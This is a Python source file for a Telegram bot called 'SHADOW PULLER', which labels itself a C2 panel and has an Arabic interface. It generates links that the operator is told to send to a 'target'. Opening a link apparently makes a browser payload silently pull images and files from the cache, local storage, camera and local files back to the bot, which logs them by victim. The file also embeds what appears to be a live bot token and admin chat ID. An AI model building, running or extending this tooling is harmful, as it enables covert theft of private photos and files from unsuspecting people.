#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================
# SHADOW PULLER - TELEGRAM C2 BOT
# ============================================

import asyncio
import uuid
import json
import os
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters

# ===== CONFIGURATION =====
BOT_TOKEN = "8713497875:AAHKRh-wFRrAX9kgx4fKLRb-f_taC_HDMqc"
ADMIN_CHAT_ID = "6960925330"
DATABASE_FILE = "puller_database.json"

# ===== DATABASE =====
class Database:
    def __init__(self):
        self.data = self.load()
    
    def load(self):
        if os.path.exists(DATABASE_FILE):
            with open(DATABASE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {"links": {}, "pulled_images": [], "victims": {}}
    
    def save(self):
        with open(DATABASE_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, indent=4, ensure_ascii=False)
    
    def add_link(self, link_id, url):
        self.data["links"][link_id] = {
            "url": url,
            "created": time.time(),
            "views": 0,
            "active": True
        }
        self.save()
    
    def add_image(self, filename, victim_ip, timestamp):
        self.data["pulled_images"].append({
            "filename": filename,
            "victim": victim_ip,
            "timestamp": timestamp
        })
        self.save()

db = Database()

# ===== BOT HANDLERS =====
async def start(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🔗 إنشاء رابط سحب جديد", callback_data='create_link')],
        [InlineKeyboardButton("📊 عرض الصور المسحوبة", callback_data='view_images')],
        [InlineKeyboardButton("📈 إحصائيات الروابط", callback_data='link_stats')],
        [InlineKeyboardButton("⚙️ إعدادات الأداة", callback_data='settings')],
        [InlineKeyboardButton("❌ حذف جميع الروابط", callback_data='delete_all')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🕷️ **SHADOW PULLER v3.0**\n\n"
        "أهلاً بك في لوحة تحكم سحب الصور.\n"
        "اختر العملية المطلوبة:",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'create_link':
        link_id = str(uuid.uuid4())[:8]
        url = f"https://shadow-puller-2099.vercel.app/?id={link_id}"
        db.add_link(link_id, url)
        
        keyboard = [[InlineKeyboardButton("🔙 العودة للقائمة", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🕸️ **تم إنشاء رابط السحب بنجاح!**\n\n"
            f"📎 **الرابط:** `{url}`\n\n"
            "📋 **تعليمات:**\n"
            "1. أرسل هذا الرابط للهدف\n"
            "2. عند فتحه سيتم سحب الصور تلقائياً\n"
            "3. جميع الصور ستصل إلى هذا البوت\n\n"
            "⏱ مدة الرابط: نشط حتى الحذف",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    elif query.data == 'view_images':
        images = db.data["pulled_images"]
        if not images:
            text = "📭 **لا توجد صور مسحوبة بعد**\nأنشئ رابطاً وارسله لهدف!"
        else:
            text = f"📊 **الصور المسحوبة ({len(images)}):**\n\n"
            for img in images[-20:]:  # آخر 20 صورة
                text += f"📸 `{img['filename']}`\n"
        
        keyboard = [[InlineKeyboardButton("🔙 العودة", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=reply_markup)
    
    elif query.data == 'link_stats':
        links = db.data["links"]
        active_links = {k: v for k, v in links.items() if v["active"]}
        
        text = f"📈 **إحصائيات الروابط:**\n\n"
        text += f"• 🔗 إجمالي الروابط: {len(links)}\n"
        text += f"• 🟢 الروابط النشطة: {len(active_links)}\n"
        text += f"• 🖼️ الصور المسحوبة: {len(db.data['pulled_images'])}\n\n"
        
        if active_links:
            text += "**الروابط النشطة:**\n"
            for link_id, link_data in active_links.items():
                text += f"• `{link_data['url']}`\n"
        
        keyboard = [[InlineKeyboardButton("🔙 العودة", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=reply_markup)
    
    elif query.data == 'settings':
        keyboard = [[InlineKeyboardButton("🔙 العودة", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "⚙️ **إعدادات الأداة:**\n\n"
            "✅ سحب من الكاش\n"
            "✅ سحب من IndexedDB\n"
            "✅ سحب من Local Storage\n"
            "✅ سحب من الكاميرا\n"
            "✅ سحب من الملفات المحلية\n"
            "✅ سحب من Canvas\n"
            "✅ إرسال فوري للبوت\n\n"
            "🔒 الأداة في وضع التخفي الكامل",
            reply_markup=reply_markup
        )
    
    elif query.data == 'delete_all':
        keyboard = [
            [InlineKeyboardButton("✅ نعم، احذف الكل", callback_data='confirm_delete')],
            [InlineKeyboardButton("❌ إلغاء", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "⚠️ **تأكيد الحذف**\n\n"
            "هل أنت متأكد من حذف جميع الروابط والصور؟",
            reply_markup=reply_markup
        )
    
    elif query.data == 'confirm_delete':
        db.data = {"links": {}, "pulled_images": [], "victims": {}}
        db.save()
        
        keyboard = [[InlineKeyboardButton("🔙 العودة", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "✅ **تم حذف جميع البيانات بنجاح**",
            reply_markup=reply_markup
        )
    
    elif query.data == 'back':
        keyboard = [
            [InlineKeyboardButton("🔗 إنشاء رابط سحب جديد", callback_data='create_link')],
            [InlineKeyboardButton("📊 عرض الصور المسحوبة", callback_data='view_images')],
            [InlineKeyboardButton("📈 إحصائيات الروابط", callback_data='link_stats')],
            [InlineKeyboardButton("⚙️ إعدادات الأداة", callback_data='settings')],
            [InlineKeyboardButton("❌ حذف جميع الروابط", callback_data='delete_all')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🕷️ **SHADOW PULLER v3.0**\n\nاختر العملية المطلوبة:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

async def handle_photo(update: Update, context):
    """استقبال الصور المسحوبة وحفظها"""
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    
    filename = f"pulled_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    await file.download_to_drive(f"pulled_images/{filename}")
    
    db.add_image(filename, update.message.from_user.id if update.message.from_user else "unknown", time.time())
    
    print(f"[SHADOW] Image saved: {filename}")

async def handle_document(update: Update, context):
    """استقبال الملفات المسحوبة"""
    if update.message.document:
        doc = update.message.document
        file = await context.bot.get_file(doc.file_id)
        await file.download_to_drive(f"pulled_images/{doc.file_name}")
        db.add_image(doc.file_name, update.message.from_user.id if update.message.from_user else "unknown", time.time())

# ===== MAIN =====
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("[SHADOW PULLER] Bot is running...")
    print("[SHADOW PULLER] Awaiting commands...")
    
    await app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())